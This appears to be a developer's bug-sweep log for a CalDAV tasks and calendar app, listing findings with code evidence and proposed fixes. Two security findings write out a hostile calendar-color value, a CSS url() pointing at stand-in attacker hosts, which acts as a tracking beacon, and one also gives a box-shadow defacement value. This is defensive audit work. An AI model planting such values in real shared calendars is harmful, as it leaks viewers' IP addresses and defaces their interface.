Reproduced (vitest): untick "Tags" -> type `errand{Enter}` into "Tags, row 1" -> re-tick "Tags" -> the shared Tags control shows no chips, and submitting row 1 sends `{summary:'a'}` with **no `tags` key**. The same sequence with Due (a string slot) correctly adopts `2026-08-10`, so the behaviour is inconsistent between properties. The existing test 'adopts a value already typed per-row when the property becomes shared' only covers Due, so nothing catches it.

Second consequence of the same reference compare: `donor` matches rows[0] unconditionally for Tags (every row's `tags` array is a distinct object), so if the guard is fixed naively the wrong row can donate.
```

</details>

**Suggested fix.** Compare slots by value, e.g. reuse the `same()` helper TasksView already has: `const eq
= (a, b) => Array.isArray(a) && Array.isArray(b) ? a.length === b.length && a.every((x,
i) => x === b[i]) : a === b`, then use `eq` in both the `donor` find and the `every`
guard. Add the Tags case to the adoption test.

#### [x] Test gap: day-column drag-to-reschedule has no coverage at all, though it writes a DUE to a real CalDAV resource

`frontend/src/components/TasksView.tsx:150` (`dropOnDay`) · **medium** · test-gap

**Partly overtaken, then completed.** A `day-column drag` suite landed with
main's 2026-08-14 merge covering the two write shapes (zone-anchored due, all-day
due). What it did not cover was what `dropOnDay` DECIDES before writing, so this
pass added the rest: the time of day surviving a column move, a drop on the
task's own column writing nothing, and a drop that resolves no task writing
nothing.

`dropOnDay` is the only drag-driven write in the Tasks view — a drop mutates DUE on the
user's real task list — and neither it nor the surrounding `DayColumn`/`DayCard` surface
has a single test. `grep -n 'drag|Drag|drop|Drop' TasksView.test.tsx` returns only the
word "dropped" in a comment; the 3-day/week views appear once, in a negative assertion
that quick-add is absent (line 138). Everything the drop path decides is unasserted.

<details><summary>Evidence</summary>

```
TasksView.tsx:276-283
```ts
const dropOnDay = (key: string) => {
  const t = tasks.find((x) => x.uid === dragUid)
  setDragUid(null)
  if (!t) return
  if (t.due && dayKey(t.due) === key) return
  const timed = !!t.due && t.due.includes('T') && !t.due_is_date
  saveDetail(t, { due: timed ? `${key}T${toLocalInput(t.due!).slice(11, 16)}` : key })
}
```
Uncovered behaviours that would silently regress:
- an all-day due staying a bare date vs a timed due keeping its time-of-day (the `timed` ternary);
- the no-op guard when a card is dropped back on its own column;
- the optimistic paint AND the rollback when the PATCH fails (`saveDetail` -> `settle(undefined, t)` at line 271);
- the overdue pool: `overdue` (lines 341-346) uses `d < todayKey && d < firstKey` and renders only into the today column (line 450), plus the "jump to today" escape hatch at line 438 for when today is outside the window — a whole class of tasks that vanishes if that predicate drifts;
- `dragActive` gating the columns' `preventDefault` (line 527), which is what makes drops possible at all.
This path already produced one confirmed defect (the TZID-stripping drop), which is evidence the area is fragile and unguarded.
```

</details>

**Suggested fix.** Add TasksView tests in `day3` mode driving `fireEvent.dragStart(card)` / `dragOver(col)`
/ `drop(col)` and asserting: (a) an all-day task dropped on another column PATCHes
`{due:'YYYY-MM-DD'}`; (b) a timed task keeps `THH:MM`; (c) dropping on its own column
issues no PATCH; (d) a rejected PATCH restores the original due in the DOM; (e) a task
due before the window pools under the "Overdue" label in the today column and is counted
once.

#### [x] A failed list delete restores the list but permanently loses its group membership

`frontend/src/components/Sidebar.tsx:126` (`remove`) · **low** · bug · `minor`

`remove` strips the list out of every group and calls `onGroupsChange` (which in App.tsx
immediately PUTs `task_groups` to the server) BEFORE awaiting the DELETE. When the
DELETE fails, only `items` is rolled back — the group membership write is never undone,
so the list comes back ungrouped and the loss is already persisted server-side.

<details><summary>Evidence</summary>

```
Sidebar.tsx:117-128
```ts
const remove = async (id: string) => {
  setEditing(null)
  const prev = items
  const left = items.filter((l) => l.id !== id)
  onItems(left)
  if (canSelect && sel === id) onSelect?.(left[0]?.id || '')
  // Drop the deleted list out of any group so the stored blob stays tidy.
  if (groupsOn && groups!.some((g) => g.lists.includes(id))) {
    onGroupsChange!(groups!.map((g) => ({ ...g, lists: g.lists.filter((x) => x !== id) })))
  }
  if ((await api.remove(id)) === undefined) onItems(prev)   // <- groups not restored
}
```
App.tsx:245-248 shows the write is immediate and durable:
```ts
const changeTaskGroups = useCallback((next: TaskGroup[]) => {
  setTaskGroups(next); saveSettings({ task_groups: next })
}, [])
```
Failure scenario: list "Errands" sits in group "Personal". The user confirms delete; Radicale is briefly unreachable so `api.deleteList` throws, `guard` returns undefined, `onItems(prev)` puts "Errands" back in the sidebar — but it now renders under Ungrouped, and `task_groups` on the server already has it removed, so it stays that way after a reload.
```

</details>

**Suggested fix.** Snapshot `groups` alongside `items` and restore both on failure, or defer the group
cleanup until after the DELETE resolves: `const prevGroups = groups; ... if ((await
api.remove(id)) === undefined) { onItems(prev); if (groupsOn)
onGroupsChange!(prevGroups!) }`.

#### [x] The merged all-lists pane does an O(n²) scan per render (childrenOf) plus an O(n·m) lookup per row

`frontend/src/components/TasksView.tsx:88` (`colorOf`) · **low** · bug · `minor`

**Partly overtaken; the surviving half is fixed.** The `childrenOf` half was
already gone — a memoised `kidRows` Map lookup as of main's 2026-08-14 merge,
not a per-row rescan. `colorOf` still scanned `lists` for every rendered row;
it is now a `Map` built once under `useMemo`.

`childrenOf` re-scans the whole task array for every rendered top-level row, and
`colorOf` re-scans the lists array for every row. Because the view fetches every list
with `include_done=true` (api.ts:263 defaults `includeDone = true`), `tasks` holds every
completed task the account has ever had, so both scans grow with total history rather
than with what is on screen.

<details><summary>Evidence</summary>

```
TasksView.tsx:70, 294-295, 317
```ts
const colorOf = (listId: string) => lists.find((l) => l.id === listId)?.color ?? null
...
const shownTasks = tasks.filter((t) => !hiddenSet.has(t.list))
const childrenOf = (uid: string) => shownTasks.filter((t) => t.parent === uid)
...
const dotFor = (t: Task) => colorOf(t.list)
```
invoked once per row at lines 394, 413 and 421 (`kids={childrenOf(t.uid)}` / `dot={dotFor(t)}`).

Concrete: an account with 3,000 accumulated tasks (2,950 of them completed). Opening "View completed" renders `completedTasks` (~2,950 rows) and calls `childrenOf` once per row -> ~8.8M predicate calls, recomputed on every re-render of TasksView — including each `setDragUid` during a drag and each optimistic write. Turning on "Completed tasks: Shown" in the List view has the same cost. Nothing is memoized: `shownTasks`, `byUid`, `tops`, `active`, `done` and `completedTasks` (which also sorts) are all rebuilt on every render.
```

</details>

**Suggested fix.** Build the indices once: `const kidsBy = useMemo(() => { const m = new Map<string,
Task[]>(); for (const t of shownTasks) if (t.parent) (m.get(t.parent) ?? m.set(t.parent,
[]).get(t.parent)!).push(t); return m }, [shownTasks])` with `childrenOf = (uid) =>
kidsBy.get(uid) ?? EMPTY`, and a `Map` for list colors. Memoize
`shownTasks`/`tops`/`done` on `[tasks, hiddenSet, showCompleted]`.


### Calendar + Home

#### [x] Collection colors from the wire are unvalidated and go straight into the CSSOM — url() in calendar-color is a live remote-fetch beacon

`frontend/src/components/HomeView.tsx:358` (`TaskList`) · **medium** · security

`List.color` is served verbatim from whatever another CalDAV client wrote into the
collection's `ical:calendar-color`. The backend validates colors only on the write path
(`app.py:94 _check_color`, reached from PATCH /api/lists|calendars); the read path does
not: `dav/client.py:152` does `color = (r.text(X.CALENDAR_COLOR) or "").strip() or None`
and `service.py:157` serves `(settings_row["color"] ...) or row["color"]` unchanged. The
frontend then writes that string directly into element styles in four places, three of
which resolve to a plain `background` declaration where `url(...)` is valid, so the
browser issues the request. There is no Content-Security-Policy anywhere in the repo
(grep for `Content-Security-Policy` over backend/, deploy/ and frontend/index.html
returns nothing), so nothing blocks the fetch. index.html's pre-paint script rejects
`url(`/`image(`/`expression(` for appearance tokens with the comment "these values go
straight into the CSSOM" — the identical sink reached through a collection color has no
equivalent guard on either side of the wire.

<details><summary>Evidence</summary>

```
Sinks, all fed by the same unvalidated wire value:

  HomeView.tsx:342  <span className="list-dot" style={c ? { background: c } : undefined} />   // c = colorOf(t.list)
  HomeView.tsx:436  <i className="mini-dot" style={c ? { '--ev-c': c } as CSSProperties : undefined} />
  ArchivedCalendarsModal.tsx:76  <span className="swatch" style={c.color ? { background: c.color } : undefined} />
  CalendarView.tsx:117  return c ? { '--ev-c': c } as CSSProperties : undefined   // -> .ev-dot

and the CSS that turns them into a fetch:
  app.css:175  .list-dot { ... background: var(--fg-faint); }        // inline background wins
  app.css:427  .arch-row .swatch { ... background: var(--fg-faint); } // inline background wins
  app.css:817  .mini-dot { ... background: var(--ev-c, var(--accent)); }
  app.css:369  .ev-dot   { ... background: var(--ev-c, var(--accent)); }

Failure scenario: a client sharing the collection (DAVx5 / Thunderbird / anything with write access, adversary #2 in the trust model) PROPPATCHes
  <ical:calendar-color>url("https://attacker.example/px?u=1")</ical:calendar-color>
Sync caches it, GET /api/calendars returns color = 'url("https://attacker.example/px?u=1")', and React does style.setProperty('background', 'url("https://attacker.example/px?u=1")'). `background: url(...)` is a valid shorthand, so every render of the Home dashboard, the mini calendar, the mobile month grid and the archived-calendars modal issues a GET to attacker.example — leaking the viewer's IP, UA a
```

</details>

**Suggested fix.** Guard the value before it reaches a style. Add one shared helper in util.ts — `export
const cssColor = (c: string | null | undefined) => (c &&
/^#[0-9a-fA-F]{6}([0-9a-fA-F]{2})?$/.test(c) ? c : null)` — and route every `style={{
background: color }}` / `{'--ev-c': color}` site through it (HomeView 342/436,
CalendarView 117, ArchivedCalendarsModal 76, Sidebar's swatches). Belt and braces:
normalize in `_list_dto` too, dropping any `row["color"]` that does not match
`_COLOR_RE`, so a hostile value never crosses the wire. Cover it with a test that a wire
color of `url(https://x/)` renders no inline background.

#### [x] HomeView's calendar fetch has no staleness guard, so an older batch settling last leaves the mini calendar showing a stale month

`frontend/src/components/HomeView.tsx:139` (`requestWindow`) · **low** · bug · `minor`

**Re-scoped, then fixed.** Verified: the calendar half really was closed.
HomeView stopped fetching calendars itself in main's 2026-08-14 merge — it
reads through `useCalendarData()` and defers to `requestWindow`, whose
staleness guard Stage 4 made per-window in `data.tsx`. What was still
unguarded was the SCHEDULING effect in the same component: `api.schedulingLinks()`
then `api.schedulingBookings()`, sequentially, re-running on `rev`, with no
generation counter and no cleanup — the same defect one module along, and the
last fetch in the app without the guard. That one now carries a token ref.

The calendar effect fans out `api.calendars()` plus one `api.events()` per visible
calendar and commits with `setCals`/`setEvents`, with no generation counter,
AbortController or cleanup. It re-runs on `rev`, so two SSE-driven refreshes put two
multi-request batches in flight and whichever settles last wins. This is the same defect
already found and fixed in CalendarView (`loadGen` at CalendarView.tsx:87-94) and
already solved for the task half of this very component — `useAllTasks` (hooks.ts:37-48)
carries an explicit `token` ref whose docstring says it exists to stop "a slow first
load from clobbering a fast SSE-driven one". The calendar half of the same component was
left without it.

<details><summary>Evidence</summary>

```
HomeView.tsx:121-139:

  useEffect(() => {
    if (!needsCal) { setCals([]); setEvents([]); return }
    const guard = makeGuard(onExpire)
    guard(async () => {
      const all = await api.calendars()
      const visible = all.filter((c) => !archived.has(c.id))
      const from = ymd(days[0])
      const to = ymd(addDays(days[41], 1))
      const evs = (await Promise.all(visible.map((c) => api.events(c.id, from, to)))).flat()
      setCals(all)
      setEvents(evs)
    })
  }, [rev, needsCal, archivedKey])

No `let live = true` / `return () => { live = false }`, no token compare before the setState pair.

Failure scenario: user sits on Home with the Mini calendar module. Two writes land >250ms apart (App.tsx:273-282 debounces the SSE burst at 250ms) — e.g. DAVx5 syncs a deletion, then a second later a creation. rev goes 5 -> 6 -> 7, spawning batch A (pre-deletion snapshot, 1+N requests) and batch B (current). Under HTTP/1.1 connection contention, or with one calendar carrying a slow recurrence expansion, A settles after B. `setEvents(A)` lands last, so the mini calendar keeps dotting the deleted event and misses the new one. Nothing corrects it: `days` is memoized on `rev` and the effect only re-runs on the next rev bump, so the dashboard shows a snapshot the server no longer has until an unrelated write happens. The task modules beside it are correct, because `useAllTasks` guards.
```

</details>

**Suggested fix.** Mirror `useAllTasks`: add `const calToken = useRef(0)`, take `const mine =
++calToken.current` at the top of the effect, and gate both commits on `if (mine !==
calToken.current) return` before `setCals(all)` (and again before `setEvents(evs)`). Add
a HomeView test in the shape of CalendarView.test.tsx's "ignores an older fetch that
settles after a newer one": hold the first `api.events` promise, bump `rev`, let the
second resolve, then release the first and assert the dots came from the newer batch.

#### [x] Moving an event into a hidden calendar makes it vanish from the grid with no feedback; only the create path un-hides

`frontend/src/components/CalendarView.tsx:322` (`save`) · **low** · rendering · `minor`

The EventModal's Calendar `<select>` is populated from `visibleCals`, which is every
non-archived calendar *including* hidden ones (hidden is applied as a pure render
filter, CalendarView.tsx:121-124). The create branch of `save` explicitly reveals the
target calendar so a new event cannot disappear ("Don't let a fresh event vanish into a
hidden calendar — reveal it"), but the move branch — reached by opening an existing
event and picking a different calendar — has no such handling. After `api.moveEvent`
succeeds, `reload()` refetches, `visibleEvents` filters the event out, and the event
silently disappears from the month grid, the mobile agenda and the day popovers.

<details><summary>Evidence</summary>

```
CalendarView.tsx:162-178:

  const save = async (body, cal, uid?, moveTo?) => {
    setDraft(null)
    if (!uid) {
      const created = await guard(() => api.createEvent(cal, body))
      if (!created) return
      // Don't let a fresh event vanish into a hidden calendar — reveal it.
      if (hidden.has(cal)) onHiddenCalendarsChange(hiddenCalendars.filter((x) => x !== cal))
      ...
      return
    }
    const painted = applyLocal(uid, body)
    const ok = await guard(() => api.patchEvent(cal, uid, body))
    const moved = !!(ok && moveTo && moveTo !== cal)
    if (moved) await guard(() => api.moveEvent(cal, uid, moveTo!))   // <-- no un-hide
    if (!ok || !painted || moved) reload()
  }

Failure scenario: calendars Work (shown) and Personal (eye toggled off in the sidebar, so it renders dimmed and its events are filtered out). The user clicks a Work event, changes Calendar to "Personal" — the select lists it, nothing marks it hidden — and saves. The PATCH and the move both succeed, `reload()` refetches, and `visibleEvents` drops the event because `hidden.has('personal')`. The event is gone from the grid with no toast and no trace; the user's only clue is the dimmed sidebar row. Doing the identical thing while *creating* an event works fine, which is what makes it read as data loss rather than a visibility setting.
```

</details>

**Suggested fix.** Reveal the destination on a successful move too: after `if (moved) await guard(() =>
api.moveEvent(cal, uid, moveTo!))`, add `if (moved && hidden.has(moveTo!))
onHiddenCalendarsChange(hiddenCalendars.filter((x) => x !== moveTo))` — the same two
lines the create branch already runs. Add a CalendarView test asserting that picking a
hidden calendar in the modal drops that id from `onHiddenCalendarsChange`.


### Appearance + theming

#### [x] calendar-color read off the wire is never validated and lands in the CSSOM, so a foreign CalDAV client can plant a url() beacon

`backend/tasksd/dav/client.py:152` (`discover`) · **medium** · security

The *write* path validates collection colors (`_check_color` / `_COLOR_RE =
^#[0-9a-fA-F]{6}([0-9a-fA-F]{2})?$`, app.py:92-96, called from
create_list/patch_list/create_calendar). The *read* path does not: `discover()` takes
`calendar-color` as raw text (`color = (r.text(X.CALENDAR_COLOR) or "").strip() or
None`), stores it, and `TaskService` hands it to the SPA in the list DTO
(`service.py:157 "color": ... or row["color"]`).  The SPA writes that string straight
into the CSSOM as an inline declaration: - `Sidebar.tsx:191` `return l.color ? {
background: l.color } : undefined` — React sets `node.style.background = <wire text>` -
`Sidebar.tsx:189` `boxShadow: \`inset 0 0 0 1.5px ${l.color || 'var(--fg-faint)'}\`` —
string interpolation into a shorthand - `CalendarView.tsx:117`, `HomeView.tsx:436/449`,
`ArchivedCalendarsModal.tsx:145` set `{'--ev-c': c}`, which React applies via
`style.setProperty('--ev-c', c)`  and app.css then uses `--ev-c` in properties that
accept an `<image>`: `.ev-dot` (app.css:374) and `.mini-dot` (app.css:821) are both
`background: var(--ev-c, var(--accent))`. `background: url(https://evil.example/x.png)`
on a rendered 3-5px element fetches the URL — an exfil/tracking beacon that fires
whenever the owner opens the Calendar tab or the Home mini-calendar. This is precisely
the sink the appearance allowlist exists to close (app.css:902 even names it: "an inline
custom property, which is exactly the thing the appearance allowlist exists to keep
out"), on a path with no allowlist at all.  Per the trust model, hostile-shaped data
arriving from Radicale is adversary #2 — anything with write access to the shared
collection (DAVx5, jtx Board, Thunderbird, Apple Calendar, or anyone the collection is
shared with) can PROPPATCH `calendar-color` to arbitrary text; Radicale stores dead
properties verbatim.

<details><summary>Evidence</summary>

```
backend/tasksd/dav/client.py:151-152 — no validation, unlike the write path:
```python
name = r.text(X.DISPLAYNAME) or r.href.rstrip("/").rsplit("/", 1)[-1]
color = (r.text(X.CALENDAR_COLOR) or "").strip() or None
```
compare backend/tasksd/app.py:92-96, which the API write path *does* enforce:
```python
_COLOR_RE = re.compile(r"^#[0-9a-fA-F]{6}(?:[0-9a-fA-F]{2})?$")
def _check_color(color: str | None) -> None:
    if color is not None and not _COLOR_RE.match(color):
        raise HTTPException(422, "color must be #RRGGBB or #RRGGBBAA")
```

Failure scenario A (beacon): another client PROPPATCHes `<ical:calendar-color>url(https://evil.example/b.png)</ical:calendar-color>` on a calendar collection. Sync stores it; `GET /api/lists` returns `"color": "url(https://evil.example/b.png)"`. HomeView renders `<i class="mini-dot" style="--ev-c: url(https://evil.example/b.png)">`; `.mini-dot { background: var(--ev-c, var(--accent)) }` resolves to `background: url(https://evil.example/b.png)` and the browser issues the request (owner IP, UA, timing) on every Home render. Same via `.ev-dot` on the mobile calendar grid, and directly via `Sidebar.tsx:191`'s `style.background`.

Failure scenario B (defacement): set `calendar-color` to `red, 0 0 0 200vmax red`. In visibility mode `Sidebar.tsx:189` builds `boxShadow: 'inset 0 0 0 1.5px red, 0 0 0 200vmax red'` — a valid box-shadow list — and the 8x8px swatch paints an opaque field over the whole sidebar (clipped by `.side { overflow: hidden }`
```

</details>

**Suggested fix.** Validate at ingest, where the invariant belongs: in `DavClient.discover` reuse the same
`#RRGGBB(AA)?` shape the write path enforces and drop (or null out) anything else —
`color = c if c and _COLOR_RE.match(c) else None`. Belt-and-braces on the client: have
Sidebar/CalendarView/HomeView pass colors through a shared `safeColor()` that returns
`undefined` for anything not matching `^#[0-9a-fA-F]{6}([0-9a-fA-F]{2})?$` before it
reaches an inline style or `--ev-c`, and stop interpolating a wire value into the
`boxShadow` shorthand. Add a sync test asserting a `calendar-color` of `url(//evil)`
surfaces as `color: null` in the list DTO.

#### [x] The Appearance editor's color text field overrides the mobile 16px input floor, reintroducing iOS Safari's zoom-on-focus

`frontend/src/styles/app.css:929` (`.appear-text`) · **low** · rendering · `minor`

app.css:567 sets a deliberate floor inside `@media (max-width: 720px)`: `.input { font-
size: max(16px, calc(16px * var(--fs-scale))) }`, with the comment "The floor is load-
bearing: a text scale below 1 would drop under 16px and bring the zoom-on-focus back".
The file then does the work twice more (line 947) to restore that floor for `.bulk-row
.input` and `.sched-range .input`, whose (0,2,0) selectors outrank it.  `.appear-text`
at line 858 has the *same* (0,1,0) specificity as the mobile `.input` rule but appears
later in the same stylesheet, so it wins on source order — in every viewport, including
mobile. The Appearance editor's raw color field (`className={`input mono appear-text
...`}`, AppearancePanel.tsx:270) therefore renders at `calc(12px * var(--fs-scale))` on
a phone, i.e. 12px at the default scale and 9.6px at the minimum `--fs-scale` of 0.8.
Both are under 16px, which is exactly the condition the floor exists to prevent.

<details><summary>Evidence</summary>

```
Cascade for the accent value field (`class="input mono appear-text"`), all three rules at specificity (0,1,0), later source order wins:
```
tokens.css:126-129   .input      { font-size: calc(14px * var(--fs-scale)); }
app.css:467-587      @media (max-width: 720px) {
app.css:567            .input    { font-size: max(16px, calc(16px * var(--fs-scale))); }
app.css:587          }
app.css:858          .appear-text { font-size: calc(12px * var(--fs-scale)); }   <-- last, wins
app.css:870-874      @media (max-width: 720px) { .appearance-modal / .appear-row / .appear-control }  (no font-size)
```
The mobile block that restores the floor for the other dense inputs (app.css:936-947) lists only `.bulk-row .input, .sched-range .input` — `.appear-text` is not in it.

Failure: on iPhone Safari, Settings -> Appearance -> tap the raw value box next to any color swatch. Safari zooms the page in on focus; per the comment at app.css:940-947 it does not zoom back, so every subsequent tap in the modal lands offset from what the user sees and the panel reads as broken. Same for the 20 other color/value fields in the panel.
```

</details>

**Suggested fix.** Add `.appear-text` to the restoring rule in the mobile block, e.g. inside `@media (max-
width: 720px)` at app.css:870-874 add `.appear-text { font-size: max(16px, calc(12px *
var(--fs-scale))); }` (or append `.appear-text` to the existing `.bulk-row .input,
.sched-range .input` rule at line 947).


### Cross-cutting

#### [x] Saving a DURATION-only event collapses it to zero length (silently destroys its span, and it stops blocking bookings)

`frontend/src/components/CalendarView.tsx:638` (`EventModal`) · **medium** · bug

`EventModal` reconstructs the end field from `e.end` only. A VEVENT written with
`DURATION` instead of `DTEND` (the repo's own test calls this "DAVx5/phone-client style"
— backend/tests/test_scheduling.py:103) arrives with `end: null` and its length carried
in the ignored `duration` field of the DTO. The modal then defaults the end picker to
`${baseDate}T10:00`, and `commit()` sends `start` and `end` on every save for a non-
recurring event — so any edit, including a pure rename, rewrites the event's end.
`_apply_event_fields` deletes DURATION whenever a dtend is supplied
(backend/tasksd/ical/edit.py:398), so the original span is gone for good. Because
`scheduling.busy_intervals` only counts an interval when `end > start`, the resulting
zero-length event no longer blocks booking slots either.

<details><summary>Evidence</summary>

```
Code: `const [end, setEnd] = useState(() => { if (!e?.end) return `${baseDate}T10:00` ... })`, then `commit()` -> `onSave({ ...details, start: startOut, end: endOut, ...repeatFields() }, calPick, e.uid)`, with `const clampedEnd = endVal < startVal ? startVal : endVal`.

Verified by rendering CalendarView against a DURATION-only event (`start: '2026-03-02T10:00:00'`, `end: null`), opening it, changing only the title, and pressing Save. The PATCH body was:
  {"summary":"Renamed","location":"","description":"","tags":[],"start":"2026-03-02T10:00","end":"2026-03-02T10:00","repeat":"none"}
end == start: a 90-minute meeting (DTSTART:20260302T100000 / DURATION:PT1H30M) becomes a zero-length event on the wire for every CalDAV client, and `busy_intervals` (`if end > start`) then treats it as blocking nothing, so a booking link offers that time as free. If the event starts at 14:00 instead, `clampedEnd` also pins end to start; if it starts at 08:00 the event is silently stretched to 2h.
```

</details>

**Suggested fix.** Add `duration: string | null` to the `CalEvent` interface (the backend DTO already
carries it — service.py `_event_dto`) and seed the end picker from `start + duration`
when `end` is null, parsing the ISO-8601 duration. Where no end can be derived at all
(no DTEND and no DURATION), omit `end` from the PATCH body instead of sending a
fabricated one, so the write leaves the stored span untouched. Add a CalendarView test
for an `end: null` event asserting the save either preserves the span or omits `end`.

#### [x] get_events_in_range drops DURATION-only events that started before the window — invisible in the grid and, worse, invisible to the booking conflict check

`backend/tasksd/db/store.py:499` · **medium** · bug

The candidate query tests overlap with `COALESCE(dtend, dtstart) >= start_iso`. For an
event whose length is expressed as `DURATION` (no DTEND), `dtend` is NULL, so the
event's effective end collapses to its start and any DURATION-only event whose DTSTART
precedes the window is excluded outright — even though it still covers days inside it.
This is the same query `TaskService._link_busy` uses to build the busy set for booking
links (it only widens the window by ±1 day), so a multi-day DURATION-only block on the
owner's calendar does not block slots on its later days, and an unauthenticated visitor
on /book/{token} can book straight over it. The same rows are also missing from the
calendar grid for those days.

<details><summary>Evidence</summary>

```
SQL: "SELECT * FROM items WHERE collection_href=? AND component='VEVENT' AND dtstart <= ? AND (has_rrule=1 OR COALESCE(dtend, dtstart) >= ?) ORDER BY dtstart" — `duration` is never consulted.

Reproduced against the real store: seeding `DTSTART:20260710T100000` + `DURATION:P3D` (extract gives dtstart=2026-07-10T10:00:00, dtend=None, duration='P3D') and querying:
  get_events_in_range(db, '/cal/', '2026-07-12', '2026-07-13') -> []   (event covers 7/12)
  get_events_in_range(db, '/cal/', '2026-07-10', '2026-07-13') -> ['dur']
Booking path: book_slot for a 2026-07-12 request builds `_link_busy` over [day0, day0+1d] -> events_in_range('2026-07-11T00:00:00', '2026-07-14T00:00:00'); dtstart 2026-07-10T10:00 fails the `>= start_iso` test, so the 3-day busy block is absent from `busy` and generate_slots offers 7/12 as free -> a public visitor books a VEVENT on top of it. (backend/tests/test_scheduling.py:103 documents DURATION-only VEVENTs as a real client shape, and test_recur.py:544 only covers the DTEND case.)
```

</details>

**Suggested fix.** Admit rows that carry a duration on the upper bound alone, the way recurring masters
already are — `AND (has_rrule=1 OR duration IS NOT NULL OR COALESCE(dtend, dtstart) >=
?)` — and let the precise interval math downstream (scheduling.busy_intervals already
parses `duration`) filter them; or compute the effective end in SQL from
dtstart+duration. Extend the frontend's `lastDayOf`/`bucketByDay` to use `duration` so
such a span renders on every day it covers. Add a store-level test with a DURATION-only
multi-day event and a scheduling test asserting it blocks a slot on its second day.

#### [x] Dragging a task to another day column strips the TZID from a zone-anchored DUE and moves the deadline

`frontend/src/components/TasksView.tsx:282` · **medium** · bug · `minor`

`dropOnDay` builds the new due as a naive local string (`${key}T${HH:MM}`) instead of
going through the `dateOut` helper defined at the top of this same file, which exists
precisely to send the *instant* when the property it replaces was zone-anchored by
another CalDAV client. The backend's `_set_datelike` only re-expresses the value in the
property's original zone when both sides are aware; a naive value is written verbatim,
so `DUE;TZID=Europe/Berlin:...` becomes a floating `DUE:...` at the dragging viewer's
wall clock. The single-task editor was fixed for exactly this (`dateOut`, and its tests
at TasksView.test.tsx:413 "sends the instant, not a naive wall clock, for a zone-
anchored due"); the drag path was missed and has no test at all (no occurrence of "drag"
in TasksView.test.tsx).

<details><summary>Evidence</summary>

```
Code: `const timed = !!t.due && t.due.includes('T') && !t.due_is_date; saveDetail(t, { due: timed ? `${key}T${toLocalInput(t.due!).slice(11, 16)}` : key })` — `dateOut(date, time, original)` / `hasZone(t.due)` are never consulted here.

Concrete run of the resulting server-side write: a task with `DUE;TZID=Europe/Berlin:20260810T093000`, viewer in America/New_York (shows 03:30 on Aug 10), dragged to the Aug 11 column, sends `due: "2026-08-11T03:30"`. `apply_changes(raw, TaskEdit(due=datetime.fromisoformat('2026-08-11T03:30')))` produced:
  DUE:20260811T033000
The TZID is gone and the deadline has moved 6 hours for every other client and device (the Berlin client now reads 03:30 instead of 09:30).
```

</details>

**Suggested fix.** Route the drag through the existing helper: `saveDetail(t, { due: timed ? dateOut(key,
toLocalInput(t.due!).slice(11, 16), t.due) : key })`. Add a TasksView test that drops a
task with a zone-anchored due onto a day column and asserts the PATCH body carries an
instant (trailing `Z`), mirroring the existing editor test at TasksView.test.tsx:413.

#### [x] Error toasts render underneath any open modal's scrim, dimmed and unclickable

`frontend/src/styles/app.css:590` · **low** · rendering · `minor`

`.toast` sits at `z-index: 90` while `.overlay` (every modal backdrop, including the
Appearance panel, the archived-calendars modal and the task/event modals) sits at
`z-index: 100` with a full-viewport `rgba(0,0,0,0.32)` background. Both are in the root
stacking context (`.shell` creates none), so a toast raised while a modal is open paints
below the scrim: the message is dimmed to near-illegibility and its dismiss button
cannot be clicked because the overlay intercepts the pointer (a click there closes the
modal instead). The Appearance panel is exactly where a settings write is most likely to
fail, and App.tsx's `saveSettings` reports those failures only through this toast.

<details><summary>Evidence</summary>

```
app.css:590-591 `.toast { position: fixed; left: 50%; bottom: 24px; ...; z-index: 90; }` vs app.css:396-397 `.overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.32); ...; z-index: 100; }`.

Scenario: user opens Settings -> Appearance -> Customize (AppearancePanel renders inside `.overlay`), drags a token slider; `saveSettingsSoon` -> `saveSettings` -> the server answers 422/500 -> `showToast("Couldn't save your preferences: ...")` (App.tsx:163). The toast element is in the DOM but painted under the scrim; the user sees a washed-out strip they cannot dismiss, and clicking it closes the panel.
```

</details>

**Suggested fix.** Give `.toast` a z-index above the overlay layer (e.g. `z-index: 120`), so the app's only
error channel is always legible and dismissable on top of modal UI.


---

# Sweep — 2026-07 (closed)

## iCalendar read + edit path

### [x] "Repeat until <date>" writes a DATE-valued UNTIL onto a timed series, dropping the last occurrence the user asked for

`backend/tasksd/ical/edit.py:61` · **medium** · bug

`rrule_from_spec` puts the caller's `until` into the rule verbatim. The UI's "Repeat
until" field is `<input type="date">`, and `app._rrule_from_repeat` -> `_parse_datelike`
turns it into a `date`, so a timed event gets `RRULE:...;UNTIL=20260302` while DTSTART
is a DATE-TIME. RFC 5545 3.3.10 requires UNTIL's value type to match DTSTART (and
requires UTC when DTSTART is not floating); expanders read the DATE as midnight, so the
occurrence ON the chosen day is dropped.

<details><summary>Evidence</summary>

```
rrule_from_spec('weekly', until=date(2026,3,2)) with build_new_event(dtstart=2026-02-02 09:00) produces:
  DTSTART:20260202T090000
  RRULE:FREQ=WEEKLY;UNTIL=20260302
expand_occurrences(raw, 2026-01-01, 2026-04-01) -> ['2026-02-02T09:00','2026-02-09T09:00','2026-02-16T09:00','2026-02-23T09:00'] — the 2026-03-02 09:00 occurrence the user explicitly asked to repeat *until* is missing, because UNTIL is read as 2026-03-02T00:00.
```

</details>

**Suggested fix.** Coerce UNTIL to DTSTART's value type: when the series start is a datetime, expand a
supplied `date` to end-of-day in the series' zone (or UTC 23:59:59Z) before writing it;
keep a bare DATE only for all-day series. Add a test asserting the UNTIL day's
occurrence is included.

### [x] _shift_datelike drops property parameters — RECURRENCE-ID;RANGE=THISANDFUTURE silently becomes a single-instance override

`backend/tasksd/ical/edit.py:454` · **medium** · bug · `minor`

`_shift_datelike` deletes the property and re-adds only its value, so every parameter
other than the TZID icalendar re-derives from tzinfo is lost. The one that carries
meaning is `RANGE=THISANDFUTURE` on RECURRENCE-ID (RFC 5545 3.2.13, written by Apple
Calendar and others): it means "this override applies to this and all later
occurrences". After a whole-series reschedule the parameter is gone, so the override
collapses to a single instance and every later occurrence silently reverts to the
master's values. This is exactly the kind of silent semantic loss invariant #2 exists to
prevent, and the fidelity suite never exercises the VEVENT paths so nothing catches it.

<details><summary>Evidence</summary>

```
Input override component:
  RECURRENCE-ID;RANGE=THISANDFUTURE;TZID=America/New_York:20260108T090000
  DTSTART;TZID=America/New_York:20260108T110000
After shift_series(raw, '2026-01-08T09:00:00-05:00', EventEdit(dtstart=2026-01-08 12:00)) the component is:
  RECURRENCE-ID;TZID=America/New_York:20260108T100000   <-- RANGE=THISANDFUTURE gone
Same loss applies to any X- parameter or VALUE parameter a foreign client attached to DTSTART/DTEND/RECURRENCE-ID.
```

</details>

**Suggested fix.** Preserve the original property's `params` across the rewrite: capture `prop.params`
